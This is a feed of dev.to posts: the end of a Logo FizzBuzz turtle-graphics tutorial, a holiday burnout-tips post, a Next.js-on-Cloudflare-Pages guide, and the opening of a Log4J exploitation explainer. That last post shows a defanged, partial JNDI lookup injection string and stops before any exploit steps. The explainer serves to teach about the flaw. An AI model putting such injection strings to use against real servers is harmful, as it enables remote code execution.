  pu rt 180 fd 5 rt 120 fd 11 lt 120 fd 10
  ; reset pen state
  pd lt 90
end

to draw_buzz
  draw_b draw_u draw_z draw_z
end

cs
repeat 3 [draw_buzz]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#digits"&gt;
  &lt;/a&gt;
  Digits
&lt;/h3&gt;

&lt;p&gt;Doing this 10 more times with proper loops for each digit would be a bit much, so let's do them in style of &lt;a href="https://en.wikipedia.org/wiki/Seven-segment_display"&gt;7-segment display&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For 1 I'll use the I code instead to avoid awkward spacing.&lt;/p&gt;

&lt;p&gt;Here's the code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;;  C
; B D
;  G
; A E
;  F
to seven_seg :a :b :c :d :e :f :g
  ifelse :a [pd] [pu]
  fd 5
  ifelse :b [pd] [pu]
  fd 5
  rt 90
  ifelse :c [pd] [pu]
  fd 5
  rt 90
  ifelse :d [pd] [pu]
  fd 5
  ifelse :e [pd] [pu]
  fd 5
  rt 90
  ifelse :f [pd] [pu]
  fd 5
  pu rt 90 fd 5 rt 90
  ifelse :g [pd] [pu]
  fd 5
  pu fd 5 rt 90 fd 5 rt 180 pd
end

to draw_0
  seven_seg true true true true true true false
end

to draw_1
  fd 10 pu
  rt 90 fd 5
  rt 90 fd 10
  pd rt 180
end

to draw_2
  seven_seg true false true true false true true
end

to draw_3
  seven_seg false false true true true true true
end

to draw_4
  seven_seg false true false true true false true
end

to draw_5
  seven_seg false true true false true true true
end

to draw_6
  seven_seg true true true false true true true
end

to draw_7
  seven_seg false false true true true false false
end

to draw_8
  seven_seg true true true true true true true
end

to draw_9
  seven_seg false true true true true true true
end

to draw_digits
  draw_0 draw_1 draw_2 draw_3 draw_4
  draw_5 draw_6 draw_7 draw_8 draw_9
end

reset
cs
draw_digits
ht
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And here are the digits:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--41T4dGxe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3bhendu0gpgw6ojj0mip.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--41T4dGxe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3bhendu0gpgw6ojj0mip.png" alt="Digits" width="259" height="54"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As you can see procedures can take parameters, and &lt;code&gt;ifelse condition [then] [else]&lt;/code&gt; can do some simple logic.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#numbers"&gt;
  &lt;/a&gt;
  Numbers
&lt;/h3&gt;

&lt;p&gt;To draw numbers we just need to add a bit of code and some recursion:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;...

to draw_digit :digit
  if (:digit = 0) [draw_0]
  if (:digit = 1) [draw_1]
  if (:digit = 2) [draw_2]
  if (:digit = 3) [draw_3]
  if (:digit = 4) [draw_4]
  if (:digit = 5) [draw_5]
  if (:digit = 6) [draw_6]
  if (:digit = 7) [draw_7]
  if (:digit = 8) [draw_8]
  if (:digit = 9) [draw_9]
end

to draw_number :number
  make "a (:number % 10)
  make "b (:number - :a)
  make "c (:b / 10)
  if (:c &amp;gt; 0) [draw_number :c]
  draw_digit :a
end

reset
cs
draw_number 42069
ht
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fI6NS-iF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g0vrx0m7bsxqso745fzo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fI6NS-iF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g0vrx0m7bsxqso745fzo.png" alt="Numbers" width="148" height="48"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;make "var (...)&lt;/code&gt; is how you can assign variables. We need to use a bunch of extra variables, as Logo lacks integer division.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#fizzbuzz"&gt;
  &lt;/a&gt;
  FizzBuzz
&lt;/h3&gt;

&lt;p&gt;And here's the moment we've all been waiting for, the FizzBuzz in Logo!&lt;/p&gt;

&lt;p&gt;Here's the complete program, mostly the code we wrote before:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;;  C
; B D
;  G
; A E
;  F
to seven_seg :a :b :c :d :e :f :g
  ifelse :a [pd] [pu]
  fd 5
  ifelse :b [pd] [pu]
  fd 5
  rt 90
  ifelse :c [pd] [pu]
  fd 5
  rt 90
  ifelse :d [pd] [pu]
  fd 5
  ifelse :e [pd] [pu]
  fd 5
  rt 90
  ifelse :f [pd] [pu]
  fd 5
  pu rt 90 fd 5 rt 90
  ifelse :g [pd] [pu]
  fd 5
  pu fd 5 rt 90 fd 5 rt 180 pd
end

to draw_0
  seven_seg true true true true true true false
end

to draw_1
  fd 10 pu
  rt 90 fd 5
  rt 90 fd 10
  pd rt 180
end

to draw_2
  seven_seg true false true true false true true
end

to draw_3
  seven_seg false false true true true true true
end

to draw_4
  seven_seg false true false true true false true
end

to draw_5
  seven_seg false true true false true true true
end

to draw_6
  seven_seg true true true false true true true
end

to draw_7
  seven_seg false false true true true false false
end

to draw_8
  seven_seg true true true true true true true
end

to draw_9
  seven_seg false true true true true true true
end

to draw_digit :digit
  if (:digit = 0) [draw_0]
  if (:digit = 1) [draw_1]
  if (:digit = 2) [draw_2]
  if (:digit = 3) [draw_3]
  if (:digit = 4) [draw_4]
  if (:digit = 5) [draw_5]
  if (:digit = 6) [draw_6]
  if (:digit = 7) [draw_7]
  if (:digit = 8) [draw_8]
  if (:digit = 9) [draw_9]
end

to draw_number :number
  make "a (:number % 10)
  make "b (:number - :a)
  make "c (:b / 10)
  if (:c &amp;gt; 0) [draw_number :c]
  draw_digit :a
end

to draw_i
  fd 10 ; main stroke
  ; go to next character
  pu
  rt 90 fd 5
  rt 90 fd 10
  ; reset pen state
  pd
  rt 180
end

to draw_f
  fd 10 ; main line
  rt 90 fd 5 ; top stroke
  pu rt 180 fd 5 lt 90 fd 5; move to next stroke
  pd lt 90 fd 5; middle stroke
  ; go to next character
  pu fd 5 rt 90 fd 5
  ; reset pen state
  pd
  rt 180
end

to draw_b
  fd 2.5 ; main stroke a bit
  arc 2.5 180 ; bottom loop
  fd 5 ; more main stroke
  arc 2.5 180 ; top loop
  fd 2.5 ; finish main stroke
  pu rt 180 fd 10 ; go back
  ; go to next character
  lt 90 fd 7
  ; reset pen state
  pd lt 90
end

to draw_u
  pu fw 3 pd fd 7 ; left stroke
  pu rt 90 fd 6 ; move to right stroke
  pd rt 90 fd 7 ; right stroke
  pu rt 90 fd 3 ; move to center of arc
  pd rt 180 arc 3 180 ; arc
  ; go to next character
  pu fd 8 rt 90 fd 3
  ; reset pen state
  pd rt 180
end

to draw_z
  rt 90 fd 5; bottom line
  pu rt 180 fd 5 ; return
  pd rt 120 fd 11 ; diagonal stroke
  lt 120 fd 5 ; top line
  ; advance to next character
  pu rt 180 fd 5 rt 120 fd 11 lt 120 fd 10
  ; reset pen state
  pd lt 90
end

to draw_fizz
  draw_f draw_i draw_z draw_z
end

to draw_buzz
  draw_b draw_u draw_z draw_z
end

to draw_fizzbuzz
  draw_fizz draw_buzz
end

to draw_line :i
  setxy 15 (:i * 15)
  ifelse (:i % 15 = 0) [draw_fizzbuzz] [
    ifelse (:i % 5 = 0) [draw_buzz] [
      ifelse (:i % 3 = 0) [draw_fizz] [draw_number :i]
    ]
  ]
end

reset
cs
make "i 1
repeat 30 [
  draw_line :i
  make "i (1 + :i)
]
ht
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Which generates the FizzBuzz we want:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--rkp5FaAs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/66wtbg42zbbxxzxsseuc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--rkp5FaAs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/66wtbg42zbbxxzxsseuc.png" alt="FizzBuzz" width="252" height="1140"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We had to do a few more things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;setxy x y&lt;/code&gt; moves the turtle to specific point on the screen - we use turtle position to go to the next letter, so we don't really know how far it went - it's a lot easier this way&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;make "i 1&lt;/code&gt; - there's no for loops in Logo, so we make a weird while/for hybrid by defining &lt;code&gt;i&lt;/code&gt; and increasing it 30 times&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;That's enough Logo for now.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#should-you-use-logo"&gt;
  &lt;/a&gt;
  Should you use Logo?
&lt;/h3&gt;

&lt;p&gt;No.&lt;/p&gt;

&lt;p&gt;Turtle graphics is "easier" for children only in some evil mirror universe where children's favorite subject is trigonometry. In this universe coordinate graphics with damn graph paper is drastically more approachable. And if you absolutely need to do turtle graphics, there's packages for that in every regular language anyway. Even disregarding turtle vs coordinate graphics issue, Logo is absolutely dreadful as a programming language, and learning Logo teaches no useful skill.&lt;/p&gt;

&lt;p&gt;As for teaching programming to total beginners, the easiest ways are either HTML+CSS then Javascript path (the junior web dev path), or spreadsheets then SQL path (the business analyst path). Or do what ambitious bootcamps do and start with Ruby or Python, with proper TDD from right away and so on. These approaches are all proven to work. Nobody teaches programming with Logo, as it would be horribly ineffective and completely ridiculous.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#code"&gt;
  &lt;/a&gt;
  Code
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://github.com/taw/100-languages-speedrun"&gt;All code examples for the series will be in this repository&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/taw/100-languages-speedrun/tree/master/episode-33-logo"&gt;Code for the Logo episode is available here&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>logo</category>
      <category>education</category>
    </item>
    <item>
      <title>Dec 25: Dev Holidays Guide ⛄️</title>
      <author>Helen Griffin</author>
      <pubDate>Sat, 25 Dec 2021 21:15:02 +0000</pubDate>
      <link>https://dev.to/helengriffinjr/dec-25-dev-holidays-guide-25cj</link>
      <guid>https://dev.to/helengriffinjr/dec-25-dev-holidays-guide-25cj</guid>
      <description>&lt;p&gt;Bah Humbug Tips are my own way of coping &amp;amp; recovering from burnout &amp;amp; holiday stress.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#todays-bah-humbug-tip-of-the-day"&gt;
  &lt;/a&gt;
  🎄  Today's Bah Humbug Tip of the Day.
&lt;/h3&gt;


&lt;blockquote class="ltag__twitter-tweet"&gt;

  &lt;div class="ltag__twitter-tweet__main"&gt;
    &lt;div class="ltag__twitter-tweet__header"&gt;
      &lt;img class="ltag__twitter-tweet__profile-image" src="https://res.cloudinary.com/practicaldev/image/fetch/s--_O7kx1VL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/profile_images/1455987093776240641/4OWjPQ-Z_normal.jpg" alt="State Of Devs profile image"&gt;
      &lt;div class="ltag__twitter-tweet__full-name"&gt;
        State Of Devs
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__username"&gt;
        @stateofdevs
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__twitter-logo"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir1kO05j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg" alt="twitter logo"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__body"&gt;
      ⛄️  &lt;a href="https://twitter.com/hashtag/BahHumbugTip"&gt;#BahHumbugTip&lt;/a&gt;: Good vibes only. 👇🏾
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__date"&gt;
      16:10 PM - 25 Dec 2021
    &lt;/div&gt;


    &lt;div class="ltag__twitter-tweet__actions"&gt;
      &lt;a href="https://twitter.com/intent/tweet?in_reply_to=1474774455754760192" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fFnoeFxk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-reply-action-238fe0a37991706a6880ed13941c3efd6b371e4aefe288fe8e0db85250708bc4.svg" alt="Twitter reply action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/retweet?tweet_id=1474774455754760192" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k6dcrOn8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-retweet-action-632c83532a4e7de573c5c08dbb090ee18b348b13e2793175fea914827bc42046.svg" alt="Twitter retweet action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/like?tweet_id=1474774455754760192" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SRQc9lOp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-like-action-1ea89f4b87c7d37465b0eb78d51fcb7fe6c03a089805d7ea014ba71365be5171.svg" alt="Twitter like action"&gt;
      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;


&lt;h6&gt;
  &lt;a href="#todays-options"&gt;
  &lt;/a&gt;
  🎁 Today's Options
&lt;/h6&gt;


&lt;blockquote class="ltag__twitter-tweet"&gt;
      &lt;div class="ltag__twitter-tweet__media"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7tvM5Tjj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/media/FHdyqNPVgAAKj9h.png" alt="unknown tweet media content"&gt;
      &lt;/div&gt;

  &lt;div class="ltag__twitter-tweet__main"&gt;
    &lt;div class="ltag__twitter-tweet__header"&gt;
      &lt;img class="ltag__twitter-tweet__profile-image" src="https://res.cloudinary.com/practicaldev/image/fetch/s--_O7kx1VL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/profile_images/1455987093776240641/4OWjPQ-Z_normal.jpg" alt="State Of Devs profile image"&gt;
      &lt;div class="ltag__twitter-tweet__full-name"&gt;
        State Of Devs
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__username"&gt;
        @stateofdevs
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__twitter-logo"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir1kO05j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg" alt="twitter logo"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__body"&gt;
      🤔  What are my options?&lt;br&gt;&lt;br&gt;❏ Say positive affirmations to reframe your outlook for the day.&lt;br&gt;❏ Track your small wins because they compound well.&lt;br&gt;❏ Dictate your daily gratitudes into &lt;a href="https://twitter.com/NotionHQ"&gt;@NotionHQ&lt;/a&gt;.&lt;br&gt;❏ Take quiet or digital breaks &amp;amp; enjoy the stress-free silence.&lt;br&gt;&lt;br&gt;🎄  &lt;a href="https://twitter.com/hashtag/BahHumbugTip"&gt;#BahHumbugTip&lt;/a&gt; 🎁 
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__date"&gt;
      16:10 PM - 25 Dec 2021
    &lt;/div&gt;


    &lt;div class="ltag__twitter-tweet__actions"&gt;
      &lt;a href="https://twitter.com/intent/tweet?in_reply_to=1474774457361186816" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fFnoeFxk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-reply-action-238fe0a37991706a6880ed13941c3efd6b371e4aefe288fe8e0db85250708bc4.svg" alt="Twitter reply action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/retweet?tweet_id=1474774457361186816" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k6dcrOn8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-retweet-action-632c83532a4e7de573c5c08dbb090ee18b348b13e2793175fea914827bc42046.svg" alt="Twitter retweet action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/like?tweet_id=1474774457361186816" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SRQc9lOp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-like-action-1ea89f4b87c7d37465b0eb78d51fcb7fe6c03a089805d7ea014ba71365be5171.svg" alt="Twitter like action"&gt;
      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;


&lt;p&gt;You can find more tips here &amp;amp; on &lt;a href="https://twitter.com/stateofdevs"&gt;Twitter&lt;/a&gt;. Let me know in the comments if any of these tips helps.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If you're struggling w/ burnout &amp;amp; open to sharing your story, please &lt;a href="https://stateofdevs.com/helps/dev"&gt;take the State Of Devs survey&lt;/a&gt;. 🗳 Thanks!&lt;/p&gt;
&lt;/blockquote&gt;

</description>
      <category>stateofdevs</category>
      <category>bahhumbugtip</category>
      <category>mentalhealth</category>
      <category>tips</category>
    </item>
    <item>
      <title>Deploy your Next.js app on Cloudflare pages</title>
      <author>Hrishikesh Pathak</author>
      <pubDate>Sat, 25 Dec 2021 19:46:27 +0000</pubDate>
      <link>https://dev.to/hrishiksh/deploy-your-nextjs-app-on-cloudflare-pages-55jf</link>
      <guid>https://dev.to/hrishiksh/deploy-your-nextjs-app-on-cloudflare-pages-55jf</guid>
      <description>&lt;p&gt;&lt;a href="https://pages.cloudflare.com"&gt;Cloudflare pages&lt;/a&gt; is a new hosting provider for &lt;a href="https://jamstack.org"&gt;JAMstack&lt;/a&gt; apps. It is gaining a lot of traction among developers. There are many reasons behind it. But the real reason is surely because of their pricing model.&lt;/p&gt;

&lt;p&gt;They are offering 3 crucial services free for their users. Now you can add &lt;em&gt;unlimited sites&lt;/em&gt;, &lt;em&gt;unlimited bandwidths&lt;/em&gt; and &lt;em&gt;unlimited request&lt;/em&gt; for free. You don't have to pay a dime, even if you are receiving a huge number of page views in your site daily.&lt;/p&gt;

&lt;p&gt;The offer is very lucrative. Isn't it ? So to test this out, In this tutorial we are going to deploy a &lt;a href="https://nextjs.org/"&gt;Next.js&lt;/a&gt; website in Cloudflare pages.&lt;/p&gt;

&lt;p&gt;Now the question is why Next.js not a simple &lt;a href="https://create-react-app.dev"&gt;create-react-app&lt;/a&gt; website ? This is because, Next.js is the most popular framework among JAMstack developers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setting-up-the-project"&gt;
  &lt;/a&gt;
  Setting up the project
&lt;/h2&gt;

&lt;p&gt;Before start deploying our site to Cloudflare pages, we have to do some basic drill. Make sure to follow along.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#create-a-new-nextjs-app"&gt;
  &lt;/a&gt;
  Create a new Next.js app
&lt;/h3&gt;

&lt;p&gt;For this tutorial, we are going to make a new Next.js site. So run these commands to make a new Next.js website.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npx create-next-app &amp;lt;your project name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#make-a-github-repository"&gt;
  &lt;/a&gt;
  Make a GitHub repository
&lt;/h3&gt;

&lt;p&gt;We need a &lt;a href="https://github.com"&gt;GitHub&lt;/a&gt; repository. I assume that you have a GitHub account. Cloudflare pages fetch your source code from this repository to build your website.&lt;/p&gt;

&lt;p&gt;After creating your repository, you can see a GitHub address given inside your repository. The address should be like &lt;code&gt;https://github.com/&amp;lt;your username&amp;gt;/&amp;lt;your repository name&amp;gt;.git&lt;/code&gt;. Copy this address for future use.&lt;/p&gt;

&lt;p&gt;Now come to your Next.js project root and run these commands one by one.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;git init

git add &lt;span class="nb"&gt;.&lt;/span&gt;

git commit &lt;span class="nt"&gt;-m&lt;/span&gt;&lt;span class="s2"&gt;"Initial commit"&lt;/span&gt;

git branch &lt;span class="nt"&gt;-M&lt;/span&gt; main

git remote add origin https://github.com/&amp;lt;your username&amp;gt;/&amp;lt;your repository name&amp;gt;.git

git push &lt;span class="nt"&gt;-u&lt;/span&gt; origin main
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now refresh your git repository, and you can see your Next.js source code inside your repository.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#create-a-cloudflare-account"&gt;
  &lt;/a&gt;
  Create a Cloudflare account
&lt;/h3&gt;

&lt;p&gt;Signup for &lt;a href="https://dash.cloudflare.com/sign-up/pages"&gt;Cloudflare pages&lt;/a&gt;. Then click on the &lt;strong&gt;Create a project&lt;/strong&gt;  button.&lt;/p&gt;

&lt;p&gt;Then select your GitHub account and your GitHub repository that we have created earlier. If your repository is not appearing, go to your GitHub account a give proper permission to Cloudflare extension.&lt;/p&gt;

&lt;p&gt;Then Cloudflare will guide you with their pretty simple UI.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#build-and-deploy-your-nextjs-site"&gt;
  &lt;/a&gt;
  Build and deploy your Next.js site
&lt;/h3&gt;

&lt;p&gt;Now inside the build command, if you select &lt;code&gt;Next.js static export&lt;/code&gt; then the build commands are appearing as&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;next build &amp;amp;&amp;amp; next export
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now Just hit deploy and Cloudflare will build and deploy your site across their global network of CDNs. Congratulation, now you can serve unlimited visitors absolutely for free!!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-working-and-what-is-not"&gt;
  &lt;/a&gt;
  What is working and what is not
&lt;/h2&gt;

&lt;p&gt;At the time of writing of this article, Cloudflare pages doesn't support any of the Next.js flagship features like &lt;code&gt;getStaticProps&lt;/code&gt;,&lt;code&gt;getStaticPaths&lt;/code&gt; and &lt;code&gt;getServerSideprops&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Cloudflare pages also don't support &lt;a href="https://nextjs.org/docs/api-routes/introduction"&gt;API routes&lt;/a&gt;. The &lt;code&gt;Image&lt;/code&gt; component of Next.js is also not working.&lt;/p&gt;

&lt;p&gt;Basically, Cloudflare pages do a &lt;code&gt;static export&lt;/code&gt; of your Next.js site and serve only static files.&lt;/p&gt;

&lt;p&gt;As the platform is in its early stage, we can expect support of these features in the future. If you are not using &lt;code&gt;getServerSiteProps&lt;/code&gt; in your website, then Cloudflare offer build hooks. This build hooks trigger redeployment using webhook from your CMS.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#alternative-to-nextjs-api-routes"&gt;
  &lt;/a&gt;
  Alternative to Next.js API routes
&lt;/h2&gt;

&lt;p&gt;If you are heavily dependent on Next.js API routes, then you can use &lt;a href="https://workers.cloudflare.com"&gt;Cloudflare workers&lt;/a&gt;. This is an amazing platform for build API and, like Next.js API routes, it is also serverless.&lt;/p&gt;

&lt;p&gt;Currently, I am using Cloudflare workers in production and found a very good result. It is cheap and very fast.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#some-errors-to-be-noted"&gt;
  &lt;/a&gt;
  Some Errors to be noted
&lt;/h2&gt;

&lt;p&gt;If you are using the latest version of Next.js, Sometime it can give you error on building the project. Actually, the version of &lt;a href="https://nodejs.org/en"&gt;node.js&lt;/a&gt; used in the build process is quite old. So you can set a newer version of NodeJS in your pages environment variable.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;NODE_VERSION : 16.13.1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;So, You have now learned how to deploy your Next.js site in Cloudflare workers. Look, the thing is that no platform is perfect. If you're a developer like me and want to host your portfolio site with some blog posts here and there, I think Cloudflare pages is a better choice than &lt;a href="https://vercel.com"&gt;vercel&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you are trying to build a site with a lot of moving parts, then I think, vercel is the best option you can get. Decision is yours. No one is perfect. We as a developer have to compromise. Now it is your turn. &lt;/p&gt;

&lt;p&gt;Don't forget to show me what you are building. I am on Twitter as &lt;a href="https://twitter.com/hrishikshpathak"&gt;@hrishikshpathak.&lt;/a&gt; &lt;/p&gt;

</description>
      <category>nextjs</category>
      <category>react</category>
      <category>webdev</category>
      <category>javascript</category>
    </item>
    <item>
      <title>Understanding and Exploiting Log4J Vulnerability</title>
      <author>Shivansh Sharma</author>
      <pubDate>Sat, 25 Dec 2021 19:23:11 +0000</pubDate>
      <link>https://dev.to/ieeecsvitc/understanding-and-exploiting-log4j-vulnerability-28ji</link>
      <guid>https://dev.to/ieeecsvitc/understanding-and-exploiting-log4j-vulnerability-28ji</guid>
      <description>&lt;p&gt;If you are here then you might have already heard of log4j vulnerability. It is the current trending topic in IT domain as this vulnerability made millions of sites vulnerable to RCE(Remote Code Execution). Lets try to understand what is Log4j and what vulnerability is exploited to gain RCE.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-log4j-"&gt;
  &lt;/a&gt;
  What is Log4J ?
&lt;/h2&gt;

&lt;p&gt;Log4J is a Java-based open source component maintained by the Apache Foundation that is commonly incorporated into Java applications. It allows to record traceability of operations at a functional and operational level in a multitude of services, even from a security point of view. So basically it is a library used for logging(maintaining a record of events occurred in a application) in applications.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--62u5tTIS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/er0ogd8yux7aj713z5ev.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--62u5tTIS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/er0ogd8yux7aj713z5ev.png" alt="View of a Log file" width="880" height="237"&gt;&lt;/a&gt;this image shows how a log file look like.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#what-is-the-vulnerability-in-log4j"&gt;
  &lt;/a&gt;
  What is the Vulnerability in Log4j?
&lt;/h2&gt;

&lt;p&gt;Developers were expecting the Log4j library to record application/server values, including input strings, with the expectation that those strings were plaintext and not able to invoke APIs but in log4j if we gave input parameter like &lt;code&gt;{jndi[:]ldap[:]//....&lt;/code&gt; we were able to invoke JNDI API. JNDI is the Java Naming and Directory Interface , It is a library/service allowing for runtime configuration. So, this JNDI API leads in leakage of sensitive information and thereby facilitate other attacks which finally results in getting a Reverse Shell.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#who-are-affected-by-log4j"&gt;
  &lt;/a&gt;
  Who are Affected by Log4J?
&lt;/h2&gt;

&lt;p&gt;Log4J can be found in variety of places. Its was widely used for logging in programmes, Application, Games, Application Development tool and hence hackers have a wide range of targets to attack.&lt;/p&gt;

&lt;p&gt;Average time to repair a software is 1-4 Weeks . As Log4J was widely used repairing it would takes years and hence this vulnerability is estimated to be exploited for years.&lt;/p&gt;

&lt;p&gt;From Open Source to Commercial Solutions all are affected by by this Vulnerability. Studies carried out by Google indicate that 8% of the packages in the central Maven repository have been affected by this vulnerability. you can check out this link for more info. &lt;a href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html"&gt;https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;
